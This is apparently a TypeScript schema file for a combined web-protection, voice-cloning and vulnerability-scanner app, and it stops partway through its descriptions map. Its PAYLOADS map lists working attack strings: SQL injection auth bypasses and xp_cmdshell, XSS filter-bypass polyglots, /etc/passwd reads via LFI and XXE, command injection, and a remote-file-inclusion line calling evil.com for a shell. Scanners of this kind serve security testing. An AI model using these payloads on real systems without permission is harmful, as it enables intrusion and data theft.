import { sql } from "drizzle-orm";
import { pgTable, text, varchar, integer, boolean, timestamp, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// Users table (keeping from template)
export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

// ═══════════════════════════════════════════════════════════════════════════════
// TEUFEL SHIELD PROTECTION TABLES - Permanent Storage
// ═══════════════════════════════════════════════════════════════════════════════

// Protected Domains
export const protectedDomains = pgTable("protected_domains", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  domain: text("domain").notNull().unique(),
  originIp: text("origin_ip").notNull(),
  proxyIp: text("proxy_ip").notNull(),
  status: text("status").notNull().default("active"),
  wafEnabled: boolean("waf_enabled").notNull().default(true),
  ddosProtection: boolean("ddos_protection").notNull().default(true),
  botProtection: boolean("bot_protection").notNull().default(true),
  rateLimit: integer("rate_limit").notNull().default(1000),
  blockedRequests: integer("blocked_requests").notNull().default(0),
  totalRequests: integer("total_requests").notNull().default(0),
  sslEnabled: boolean("ssl_enabled").notNull().default(true),
  createdAt: timestamp("created_at").notNull().defaultNow(),
});

// WAF Rules
export const wafRules = pgTable("waf_rules", {
  id: varchar("id").primaryKey(),
  name: text("name").notNull(),
  type: text("type").notNull(),
  pattern: text("pattern").notNull(),
  action: text("action").notNull().default("block"),
  enabled: boolean("enabled").notNull().default(true),
  hits: integer("hits").notNull().default(0),
});

// IP Blacklist/Whitelist
export const ipList = pgTable("ip_list", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  ip: text("ip").notNull(),
  type: text("type").notNull(),
  reason: text("reason").notNull().default("Manual entry"),
  addedAt: timestamp("added_at").notNull().defaultNow(),
  expiresAt: timestamp("expires_at"),
  hits: integer("hits").notNull().default(0),
});

// Geo-Blocking Rules
export const geoRules = pgTable("geo_rules", {
  id: varchar("id").primaryKey(),
  countryCode: text("country_code").notNull(),
  countryName: text("country_name").notNull(),
  action: text("action").notNull().default("block"),
  enabled: boolean("enabled").notNull().default(true),
});

// Rate Limiting Rules
export const rateLimitRules = pgTable("rate_limit_rules", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  name: text("name").notNull(),
  path: text("path").notNull(),
  requestsPerMinute: integer("requests_per_minute").notNull().default(100),
  blockDuration: integer("block_duration").notNull().default(60),
  enabled: boolean("enabled").notNull().default(true),
  triggered: integer("triggered").notNull().default(0),
});

// Security Headers
export const securityHeaders = pgTable("security_headers", {
  id: varchar("id").primaryKey(),
  name: text("name").notNull(),
  value: text("value").notNull(),
  enabled: boolean("enabled").notNull().default(true),
  description: text("description").notNull(),
});

// Brute Force Protection Rules
export const bruteForceRules = pgTable("brute_force_rules", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  name: text("name").notNull(),
  path: text("path").notNull(),
  maxAttempts: integer("max_attempts").notNull().default(5),
  lockoutDuration: integer("lockout_duration").notNull().default(900),
  enabled: boolean("enabled").notNull().default(true),
  blocked: integer("blocked").notNull().default(0),
});

// Honeypot Traps
export const honeypots = pgTable("honeypots", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  path: text("path").notNull(),
  type: text("type").notNull().default("admin"),
  triggered: integer("triggered").notNull().default(0),
  enabled: boolean("enabled").notNull().default(true),
});

// IP Reputation Cache
export const ipReputations = pgTable("ip_reputations", {
  ip: varchar("ip").primaryKey(),
  score: integer("score").notNull().default(100),
  category: text("category").notNull().default("clean"),
  lastSeen: timestamp("last_seen").notNull().defaultNow(),
  totalRequests: integer("total_requests").notNull().default(0),
  blockedRequests: integer("blocked_requests").notNull().default(0),
  country: text("country").notNull().default("Unknown"),
});

// Bot Detection Cache
export const botScores = pgTable("bot_scores", {
  ip: varchar("ip").primaryKey(),
  score: integer("score").notNull().default(100),
  isBot: boolean("is_bot").notNull().default(false),
  botType: text("bot_type"),
  fingerprint: text("fingerprint").notNull(),
  lastSeen: timestamp("last_seen").notNull().defaultNow(),
});

// Threat Logs
export const threatLogs = pgTable("threat_logs", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  timestamp: timestamp("timestamp").notNull().defaultNow(),
  type: text("type").notNull(),
  sourceIp: text("source_ip").notNull(),
  country: text("country").notNull().default("Unknown"),
  path: text("path").notNull(),
  action: text("action").notNull(),
  severity: text("severity").notNull(),
});

// ═══════════════════════════════════════════════════════════════════════════════
// TEUFEL VOICE CLONER - Voice Conversion Storage
// ═══════════════════════════════════════════════════════════════════════════════

// Voice Conversions
export const voiceConversions = pgTable("voice_conversions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  artistId: text("artist_id").notNull(),
  artistName: text("artist_name").notNull(),
  originalFile: text("original_file"),
  text: text("text"),
  outputUrl: text("output_url"),
  provider: text("provider").notNull().default("elevenlabs"),
  status: text("status").notNull().default("completed"),
  createdAt: timestamp("created_at").notNull().defaultNow(),
});

// Note: AI API Keys are stored securely as environment variables (.env file)
// Configure in .env:
// - CLAUDE_API_KEYS (comma-separated Claude API keys with rotation)
// - CLAUDE_MODEL (default: claude-sonnet-4-20250514)

// ═══════════════════════════════════════════════════════════════════════════════
// TEUFEL MUSIK GENERATOR - Generated Songs Storage
// ═══════════════════════════════════════════════════════════════════════════════

export const generatedSongs = pgTable("generated_songs", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  title: text("title").notNull(),
  prompt: text("prompt").notNull(),
  lyrics: text("lyrics"),
  genre: text("genre").notNull().default("pop"),
  mood: text("mood").notNull().default("happy"),
  instrumental: boolean("instrumental").notNull().default(false),
  duration: integer("duration").notNull().default(60),
  audioUrl: text("audio_url"),
  status: text("status").notNull().default("completed"),
  createdAt: timestamp("created_at").notNull().defaultNow(),
});

// Types for Shield tables
export type ProtectedDomain = typeof protectedDomains.$inferSelect;
export type WAFRule = typeof wafRules.$inferSelect;
export type IPEntry = typeof ipList.$inferSelect;
export type GeoRule = typeof geoRules.$inferSelect;
export type GeneratedSong = typeof generatedSongs.$inferSelect;
export type RateLimitRule = typeof rateLimitRules.$inferSelect;
export type SecurityHeader = typeof securityHeaders.$inferSelect;
export type BruteForceRule = typeof bruteForceRules.$inferSelect;
export type Honeypot = typeof honeypots.$inferSelect;
export type IPReputation = typeof ipReputations.$inferSelect;
export type BotScore = typeof botScores.$inferSelect;
export type ThreatLog = typeof threatLogs.$inferSelect;
export type VoiceConversion = typeof voiceConversions.$inferSelect;

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Vulnerability types - ALL TEUFEL VULNERABILITY CHECKS (57+ TYPES - KEINE GRENZEN!)
export const VULNERABILITY_TYPES = [
  // SQL Injection variants
  "sql_injection",
  "blind_sql_injection",
  "time_based_sql_injection",
  "error_based_sql_injection",
  // XSS variants
  "xss",
  "stored_xss",
  "reflected_xss",
  "dom_xss",
  // Authentication & Authorization
  "csrf",
  "broken_authentication",
  "broken_access_control",
  "privilege_escalation",
  "idor",
  "authentication_bypass",
  "authorization_bypass",
  // Code Execution
  "rce",
  "command_injection",
  "os_command_injection",
  // File attacks
  "arbitrary_file_upload",
  "insecure_file_download",
  "lfi",
  "rfi",
  "path_traversal",
  "directory_traversal",
  // Server-side attacks
  "ssrf",
  "ssti",
  "xxe",
  "xpath_injection",
  "nosql_injection",
  "ldap_injection",
  // JavaScript attacks
  "prototype_pollution",
  "mass_assignment",
  "insecure_deserialization",
  "object_injection",
  // Header attacks
  "header_injection",
  "crlf_injection",
  "host_header_injection",
  // JWT attacks
  "jwt_attack",
  "jwt_none_algorithm",
  "jwt_key_confusion",
  // Web attacks
  "cors_misconfig",
  "clickjacking",
  "open_redirect",
  "url_manipulation",
  // Advanced attacks
  "race_condition",
  "business_logic_flaw",
  "information_disclosure",
  "verb_tampering",
  "cache_poisoning",
  "web_cache_deception",
  "subdomain_takeover",
  "dns_rebinding",
  "request_smuggling",
  "http_response_splitting",
  // Session attacks
  "session_fixation",
  "weak_password_policy",
  "brute_force",
  "rate_limit_bypass",
  "captcha_bypass",
  // Discovery
  "insecure_headers",
  "backup_files",
  "admin_panels",
  "sensitive_files",
  "exposed_api",
  "debug_enabled",
  "default_credentials",
] as const;

export type VulnerabilityType = typeof VULNERABILITY_TYPES[number];

// Severity levels
export const SEVERITY_LEVELS = ["critical", "high", "medium", "low", "info"] as const;
export type SeverityLevel = typeof SEVERITY_LEVELS[number];

// Server header info
export interface ServerHeader {
  name: string;
  value: string;
}

// CVSS Score interface for professional vulnerability assessment
export interface CVSSScore {
  score: number;
  vector: string;
  attackVector: "Network" | "Adjacent" | "Local" | "Physical";
  attackComplexity: "Low" | "High";
  privilegesRequired: "None" | "Low" | "High";
  userInteraction: "None" | "Required";
  scope: "Unchanged" | "Changed";
  confidentiality: "None" | "Low" | "High";
  integrity: "None" | "Low" | "High";
  availability: "None" | "Low" | "High";
}

// Vulnerability finding with full details + CVSS
export interface VulnerabilityFinding {
  id: string;
  type: VulnerabilityType | string;
  severity: SeverityLevel;
  url: string;
  parameter?: string;
  payload?: string;
  description: string;
  why?: string;
  solution?: string;
  reference?: string;
  recommendation?: string;
  evidence?: string;
  poc?: string;
  timestamp: string;
  // Professional additions
  cvss?: CVSSScore;
  cwe?: string;
  owasp?: string;
  verified?: boolean;
  exploitability?: "Easy" | "Medium" | "Hard";
  impact?: "Critical" | "High" | "Medium" | "Low";
  requestSample?: string;
  responseSample?: string;
}

// Scan status
export const SCAN_STATUSES = ["idle", "running", "completed", "error", "cancelled"] as const;
export type ScanStatus = typeof SCAN_STATUSES[number];

// Scan request
export const scanRequestSchema = z.object({
  targetUrl: z.string().url("Please enter a valid URL"),
  vulnerabilityTypes: z.array(z.enum(VULNERABILITY_TYPES)).min(1, "Select at least one vulnerability type"),
});

export type ScanRequest = z.infer<typeof scanRequestSchema>;

// Scan phase
export interface ScanPhase {
  phase: number;
  name: string;
  status: string;
  details: string;
}

// Scan summary
export interface ScanSummary {
  total: number;
  critical: number;
  high: number;
  medium: number;
  low: number;
  info: number;
}

// Server info
export interface ServerInfo {
  server: string;
  poweredBy: string;
  contentType: string;
  url: string;
  port: number;
  ip?: string;
}

// Port scan result
export interface PortScanResult {
  port: number;
  state: "open" | "closed" | "filtered";
  service: string;
  banner?: string;
}

// DNS record
export interface DNSRecord {
  type: "A" | "AAAA" | "MX" | "NS" | "TXT" | "CNAME" | "SOA";
  value: string;
  priority?: number;
}

// SSL/TLS Certificate info
export interface SSLCertInfo {
  subject: string;
  issuer: string;
  validFrom: string;
  validTo: string;
  daysRemaining: number;
  protocol: string;
  cipher: string;
  keySize: number;
  isExpired: boolean;
  isValid: boolean;
  sslGrade?: string;
}

// Subdomain result
export interface SubdomainResult {
  subdomain: string;
  ip?: string;
  status?: number;
  isAlive: boolean;
}

// Directory result
export interface DirectoryResult {
  path: string;
  status: number;
  size?: number;
  redirectTo?: string;
}

// Wayback URL
export interface WaybackUrl {
  url: string;
  timestamp: string;
  statusCode?: string;
}

// Scan result
export interface ScanResult {
  id: string;
  targetUrl: string;
  timestamp: string;
  duration: string;
  status: number;
  serverHeaders: ServerHeader[];
  serverInfo: ServerInfo;
  techStack: Record<string, string[]>;
  wafDetected: string[];
  vulnerabilities: VulnerabilityFinding[];
  linksFound: string[];
  formsFound: string[];
  foldersFound: string[];
  adminPanels: string[];
  backupFiles: string[];
  sensitiveFiles: string[];
  scanPhases: ScanPhase[];
  summary: ScanSummary;
  // New advanced scan results
  openPorts?: PortScanResult[];
  dnsRecords?: DNSRecord[];
  sslCertificate?: SSLCertInfo;
  subdomains?: SubdomainResult[];
  directories?: DirectoryResult[];
  waybackUrls?: WaybackUrl[];
  whoisInfo?: Record<string, string>;
  error?: string;
}

// Payloads configuration
// ═══════════════════════════════════════════════════════════════════════════════
// VULNERABLE PARAMETERS - Common injection points for URL fuzzing
// ═══════════════════════════════════════════════════════════════════════════════
export const VULNERABLE_PARAMS = [
  "cmd", "exec", "command", "execute", "ping", "query", "jump", "code", "reg", "do",
  "func", "arg", "option", "load", "process", "step", "read", "feature", "exe", "module",
  "payload", "run", "print", "id", "user", "username", "pass", "password", "file", "url",
  "doc", "folder", "root", "path", "pg", "style", "pdf", "template", "php_path", "type",
  "name", "cat", "dir", "action", "board", "date", "detail", "download", "prefix", "include",
  "inc", "locate", "show", "site", "window", "q", "search", "searchstring", "keyword",
  "years", "txt", "tag", "max", "from", "author", "feedback", "mail", "vote", "lang",
  "view", "content", "document", "layout", "mod", "conf", "page", "redirect", "rurl",
  "dest", "destination", "redir", "redirect_uri", "return", "return_url", "goto", "next",
  "continue", "checkout_url", "image", "img", "src", "data", "input", "output", "format",
];

export const PAYLOADS: Record<VulnerabilityType, string[]> = {
  sql_injection: [
    // Basic SQL Injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "1' AND '1'='1",
    "1' AND '1'='2",
    // Auth Bypass Payloads (from user request)
    "' or 1=1",
    "' or x=x",
    "' or 0=0 --",
    "\" or 0=0 --",
    "or 0=0 --",
    "' or 0=0 #",
    "\" or 0=0 #",
    "or 0=0 #",
    "' or x=x",
    "\" or \"x\"=\"x",
    "') or ('x'='x",
    "' or 1=1--",
    "\" or 1=1--",
    "or 1=1--",
    "' or a=a--",
    "\" or \"a\"=\"a",
    "') or ('a'='a",
    "\") or (\"a\"=\"a",
    "hi\" or \"a\"=\"a",
    "hi\" or 1=1 --",
    "hi' or 1=1 --",
    "' or 1=1",
    "' or 1=1#",
    // Time-Based Blind
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND BENCHMARK(10000000,SHA1('test'))--",
    // Union-Based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION SELECT @@version--",
    "' UNION SELECT username,password FROM users--",
    // Error-Based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
    // Boolean-Based Blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND (SELECT SUBSTRING(username,1,1) FROM users)='a'--",
    // Second-Order
    "admin'--",
    "' OR ''='",
    "1' OR '1'='1",
    // MySQL Specific
    "' OR 1=1 LIMIT 1--",
    "' AND MID(version(),1,1)='5'--",
    // PostgreSQL Specific
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT COUNT(*) FROM pg_sleep(5))--",
    // MSSQL Specific
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC sp_executesql N'SELECT 1'--",
  ],
  xss: [
    // Basic XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    // Advanced XSS Payloads
    "<center><h1>XSS TEUFEL</h1></center>",
    "<img src=x onerror=\"alert('TEUFEL')\">",
    "<svg/onload=alert('TEUFEL')>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video src=x onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<math><mtext><mglyph><style><img src=x onerror=alert('XSS')>",
    "<isindex action=javascript:alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>X</button>",
    "<base href=\"javascript:alert('XSS');//\">",
    "<embed src=\"javascript:alert('XSS')\">",
    "<object data=\"javascript:alert('XSS')\">",
    // DOM-Based XSS
    "#<script>alert('XSS')</script>",
    "?q=<script>alert('XSS')</script>",
    "javascript:eval('alert(1)')",
    // Filter Bypass
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<<script>alert('XSS');//<</script>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">",
    // Event Handler XSS
    "' onfocus='alert(1)' autofocus='",
    "\" onmouseover=\"alert('XSS')\" a=\"",
    "' onclick='alert(1)'",
    // Polyglot XSS
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
  ],
  lfi: [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "../../../../etc/hosts",
    "file:///etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  ],
  command_injection: [
    "; ls",
    "| cat /etc/passwd",
    "`id`",
    "$(id)",
    "|| id",
    "&& id",
  ],
  xxe: [
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
  ],
  ssrf: [
    "http://localhost",
    "http://127.0.0.1",
    "http://[::1]",
    "file:///etc/passwd",
  ],
  path_traversal: [
    "../../../",
    "..\\..\\..\\",
    "%2e%2e%2f",
    "%252e%252e%252f",
  ],
  open_redirect: [
    "https://evil.com",
    "//evil.com",
    "\\evil.com",
    "javascript:alert(1)",
  ],
  csrf: [
    "<form action='http://evil.com' method='POST'>",
  ],
  ssti: [
    "${7*7}",
    "{{7*7}}",
    "<%= 7*7 %>",
    "${{7*7}}",
    "#{7*7}",
  ],
  idor: [
    "/user/1",
    "/admin/1",
    "/profile/1",
    "/account/1",
  ],
  cors_misconfig: [
    "Origin: https://evil.com",
    "Origin: null",
  ],
  clickjacking: [
    "<iframe src='target.com'>",
  ],
  insecure_headers: [
    "X-XSS-Protection",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Content-Security-Policy",
    "Strict-Transport-Security",
  ],
  backup_files: [
    ".bak", ".old", ".backup", ".swp", ".save",
  ],
  admin_panels: [
    "/admin", "/administrator", "/phpmyadmin", "/admin.php",
    "/admin/login.php", "/admin/index.php", "/wp-admin",
  ],
  crlf_injection: [
    "%0d%0aSet-Cookie:crlf=injection",
    "%0d%0aX-Injected:TEUFEL",
    "\r\nX-Injected:header",
  ],
  nosql_injection: [
    '{"$gt":""}',
    '{"$ne":""}',
    '[$ne]=1',
    '[$gt]=',
  ],
  prototype_pollution: [
    "__proto__[admin]=1",
    "constructor.prototype.admin=1",
    '{"__proto__":{"admin":1}}',
  ],
  header_injection: [
    "localhost\r\nX-Injected:TEUFEL",
    "localhost%0d%0aX-Injected:TEUFEL",
  ],
  rfi: [
    "http://evil.com/shell.txt",
    "php://filter/convert.base64-encode/resource=index.php",
    "data:text/plain,<?php system($_GET['cmd']);?>",
  ],
  jwt_attack: [
    '{"alg":"none","typ":"JWT"}',
    '{"alg":"HS256","typ":"JWT"}',
  ],
  // Additional vulnerability types with payloads
  blind_sql_injection: [
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND 1=1--",
    "1' AND 1=2--",
  ],
  time_based_sql_injection: [
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "'; SELECT pg_sleep(5)--",
  ],
  error_based_sql_injection: [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
  ],
  stored_xss: ["<script>alert('Stored XSS')</script>"],
  reflected_xss: ["<script>alert('Reflected XSS')</script>"],
  dom_xss: ["#<script>alert('DOM XSS')</script>"],
  broken_authentication: [],
  broken_access_control: [],
  privilege_escalation: [],
  authentication_bypass: ["' OR '1'='1", "admin'--"],
  authorization_bypass: ["/admin", "/../admin"],
  rce: ["`id`", "$(whoami)", "; cat /etc/passwd"],
  os_command_injection: ["; ls -la", "| cat /etc/passwd", "&& whoami"],
  arbitrary_file_upload: [".php", ".phtml", ".php5"],
  insecure_file_download: ["../../../etc/passwd"],
  directory_traversal: ["..\\", "../", "....//"],
  xpath_injection: ["' or '1'='1", "1' or '1'='1"],
  ldap_injection: ["*", "*)(uid=*))(|(uid=*"],
  mass_assignment: ["isAdmin=true", "role=admin"],
  insecure_deserialization: ['O:8:"stdClass":0:{}'],
  object_injection: ['{"__proto__":{"isAdmin":true}}'],
  host_header_injection: ["evil.com", "127.0.0.1"],
  jwt_none_algorithm: ['{"alg":"none"}'],
  jwt_key_confusion: ['{"alg":"HS256"}'],
  url_manipulation: ["/../admin", "/admin%00.html"],
  race_condition: [],
  business_logic_flaw: [],
  information_disclosure: [],
  verb_tampering: ["TRACE", "TRACK", "DEBUG"],
  cache_poisoning: ["X-Forwarded-Host: evil.com"],
  web_cache_deception: ["/account.css", "/profile.js"],
  subdomain_takeover: [],
  dns_rebinding: [],
  request_smuggling: ["Transfer-Encoding: chunked"],
  http_response_splitting: ["%0d%0aSet-Cookie:evil=1"],
  session_fixation: ["JSESSIONID=attacker"],
  weak_password_policy: [],
  brute_force: [],
  rate_limit_bypass: [],
  captcha_bypass: [],
  sensitive_files: [".env", "config.php", "database.yml"],
  exposed_api: ["/api/v1/users", "/swagger.json"],
  debug_enabled: ["?debug=1", "?XDEBUG_SESSION_START=1"],
  default_credentials: ["admin:admin", "root:root", "admin:password"],
};

// Vulnerability descriptions and recommendations
export const VULNERABILITY_INFO: Record<VulnerabilityType, { 
  name: string;
  description: string; 
  severity: SeverityLevel;
  recommendation: string;
  icon: string;
}> = {
  sql_injection: {
    name: "SQL Injection",
    description: "SQL injection allows attackers to manipulate database queries, potentially accessing, modifying, or deleting data.",
    severity: "critical",
    recommendation: "Use parameterized queries or prepared statements. Validate and sanitize all user inputs.",
    icon: "Database",
  },
  xss: {
    name: "Cross-Site Scripting (XSS)",
    description: "XSS allows attackers to inject malicious scripts into web pages viewed by other users.",
    severity: "high",
    recommendation: "Encode output data, use Content Security Policy (CSP), and validate/sanitize inputs.",
    icon: "Code",
  },
  lfi: {
    name: "Local File Inclusion",
    description: "LFI allows attackers to read local files on the server, potentially exposing sensitive data.",
    severity: "critical",
    recommendation: "Avoid using user input in file paths. Implement strict input validation and whitelisting.",
    icon: "FileWarning",
  },
  command_injection: {
    name: "Command Injection",
    description: "Command injection allows attackers to execute arbitrary system commands on the server.",
    severity: "critical",
    recommendation: "Avoid using system commands with user input. Use safe APIs and validate all inputs.",
    icon: "Terminal",
  },
  xxe: {
    name: "XML External Entity",
    description: "XXE allows attackers to read files, perform SSRF, or cause denial of service through XML parsing.",
    severity: "high",
    recommendation: "Disable external entity processing in XML parsers. Use less complex data formats like JSON.",
    icon: "FileCode",
  },
  ssrf: {
    name: "Server-Side Request Forgery",
    description: "SSRF allows attackers to make requests from the server to internal or external resources.",
    severity: "high",
    recommendation: "Validate and whitelist allowed URLs. Use network segmentation and firewalls.",
    icon: "Globe",
  },
  path_traversal: {
    name: "Path Traversal",
    description: "Path traversal allows attackers to access files outside the intended directory.",
    severity: "high",
    recommendation: "Use safe path APIs, validate inputs, and implement proper access controls.",
    icon: "FolderOpen",
  },
  open_redirect: {
    name: "Open Redirect",
    description: "Open redirect can be used in phishing attacks to redirect users to malicious sites.",
    severity: "medium",
    recommendation: "Validate redirect URLs against a whitelist. Avoid using user input in redirects.",
    icon: "ExternalLink",
  },
  csrf: {
    name: "Cross-Site Request Forgery",
    description: "CSRF tricks users into performing unwanted actions on authenticated web applications.",
    severity: "medium",
    recommendation: "Use CSRF tokens, SameSite cookies, and verify Origin/Referer headers.",
    icon: "ShieldAlert",
  },
  ssti: {
    name: "Server-Side Template Injection",
    description: "SSTI allows attackers to inject template code that executes on the server.",
    severity: "critical",
    recommendation: "Avoid user input in templates. Use safe templating engines and sandbox templates.",
    icon: "FileJson",
  },
  idor: {
    name: "Insecure Direct Object Reference",
    description: "IDOR allows attackers to access resources by manipulating object references.",
    severity: "high",
    recommendation: "Implement proper authorization checks. Use indirect references or UUIDs.",
    icon: "Key",
  },
  cors_misconfig: {
    name: "CORS Misconfiguration",
    description: "CORS misconfiguration can allow unauthorized cross-origin requests.",
    severity: "medium",
    recommendation: "Configure CORS headers properly. Avoid using wildcards for sensitive resources.",
    icon: "Lock",
  },
  clickjacking: {
    name: "Clickjacking",
    description: "Clickjacking tricks users into clicking hidden elements through transparent overlays.",
    severity: "medium",
    recommendation: "Use X-Frame-Options or CSP frame-ancestors directive.",
    icon: "MousePointer",
  },
  insecure_headers: {
    name: "Insecure Headers",
    description: "Missing or misconfigured security headers can expose the application to various attacks.",
    severity: "low",
    recommendation: "Implement security headers: X-XSS-Protection, X-Content-Type-Options, CSP, HSTS.",
    icon: "Shield",
  },
  backup_files: {
    name: "Exposed Backup Files",
    description: "Backup files can expose sensitive source code and configuration data.",
    severity: "medium",
    recommendation: "Remove backup files from production. Configure server to block access to sensitive files.",
    icon: "Archive",
  },
  admin_panels: {
    name: "Exposed Admin Panels",
    description: "Exposed admin panels can be targeted for brute force or exploitation attacks.",
    severity: "info",
    recommendation: "Restrict access to admin panels by IP. Use strong authentication and rate limiting.",
    icon: "Settings",
  },
  crlf_injection: {
    name: "CRLF Injection",
    description: "CRLF injection allows attackers to inject HTTP headers, leading to session fixation or XSS.",
    severity: "high",
    recommendation: "Sanitize all user input by removing CR (\\r) and LF (\\n) characters.",
    icon: "FileWarning",
  },
  nosql_injection: {
    name: "NoSQL Injection",
    description: "NoSQL injection allows attackers to bypass authentication or extract data from NoSQL databases.",
    severity: "critical",
    recommendation: "Use parameterized queries and proper input validation for NoSQL databases.",
    icon: "Database",
  },
  prototype_pollution: {
    name: "Prototype Pollution",
    description: "Prototype pollution allows attackers to inject properties into JavaScript object prototypes.",
    severity: "critical",
    recommendation: "Freeze object prototypes. Use Map instead of plain objects. Validate all object keys.",
    icon: "Code",
  },
  header_injection: {
    name: "Header Injection",
    description: "Header injection allows attackers to inject malicious HTTP headers into responses.",
    severity: "high",
    recommendation: "Validate and sanitize all user input used in HTTP headers.",
    icon: "FileCode",
  },
  rfi: {
    name: "Remote File Inclusion",
    description: "RFI allows attackers to include remote files, potentially leading to code execution.",
    severity: "critical",
    recommendation: "Disable remote file inclusion. Use whitelisting for allowed file paths.",
    icon: "Globe",
  },
  jwt_attack: {
    name: "JWT Attack",
    description: "JWT attacks exploit weak token configurations to bypass authentication or escalate privileges.",
    severity: "critical",
    recommendation: "Use strong algorithms (RS256). Validate tokens properly. Never trust client-side token data.",
    icon: "Key",
  },
  // Additional vulnerability info entries
  blind_sql_injection: { name: "Blind SQL Injection", description: "Blind SQL injection extracts data through true/false responses.", severity: "critical", recommendation: "Use parameterized queries.", icon: "Database" },
  time_based_sql_injection: { name: "Time-Based SQL Injection", description: "Time-based injection uses delays to extract data.", severity: "critical", recommendation: "Use parameterized queries.", icon: "Database" },
  error_based_sql_injection: { name: "Error-Based SQL Injection", description: "Error-based injection extracts data through error messages.", severity: "critical", recommendation: "Use parameterized queries.", icon: "Database" },
  stored_xss: { name: "Stored XSS", description: "Stored XSS persists in the database and affects all users.", severity: "critical", recommendation: "Sanitize all user input.", icon: "Code" },
  reflected_xss: { name: "Reflected XSS", description: "Reflected XSS executes from URL parameters.", severity: "high", recommendation: "Encode output.", icon: "Code" },
  dom_xss: { name: "DOM-Based XSS", description: "DOM XSS executes through client-side JavaScript.", severity: "high", recommendation: "Use safe DOM APIs.", icon: "Code" },
  broken_authentication: { name: "Broken Authentication", description: "Weak authentication mechanisms allow unauthorized access.", severity: "critical", recommendation: "Implement MFA and strong password policies.", icon: "Key" },
  broken_access_control: { name: "Broken Access Control", description: "Missing access controls allow unauthorized actions.", severity: "critical", recommendation: "Implement RBAC.", icon: "Shield" },
  privilege_escalation: { name: "Privilege Escalation", description: "Attackers can gain higher privileges.", severity: "critical", recommendation: "Implement proper authorization.", icon: "Shield" },
  authentication_bypass: { name: "Authentication Bypass", description: "Authentication can be bypassed.", severity: "critical", recommendation: "Use secure authentication.", icon: "Key" },
  authorization_bypass: { name: "Authorization Bypass", description: "Authorization checks can be bypassed.", severity: "critical", recommendation: "Implement proper access control.", icon: "Shield" },
  rce: { name: "Remote Code Execution", description: "Attackers can execute arbitrary code on the server.", severity: "critical", recommendation: "Never use user input in command execution.", icon: "Terminal" },
  os_command_injection: { name: "OS Command Injection", description: "OS commands can be injected and executed.", severity: "critical", recommendation: "Avoid shell commands with user input.", icon: "Terminal" },
  arbitrary_file_upload: { name: "Arbitrary File Upload", description: "Malicious files can be uploaded.", severity: "critical", recommendation: "Validate file types and content.", icon: "FileWarning" },
  insecure_file_download: { name: "Insecure File Download", description: "Arbitrary files can be downloaded.", severity: "high", recommendation: "Restrict downloadable paths.", icon: "FileWarning" },
  directory_traversal: { name: "Directory Traversal", description: "Attackers can access files outside the web root.", severity: "high", recommendation: "Validate and sanitize file paths.", icon: "FolderOpen" },
  xpath_injection: { name: "XPath Injection", description: "XPath queries can be manipulated.", severity: "high", recommendation: "Use parameterized XPath.", icon: "FileCode" },
  ldap_injection: { name: "LDAP Injection", description: "LDAP queries can be manipulated.", severity: "high", recommendation: "Escape LDAP special characters.", icon: "Database" },
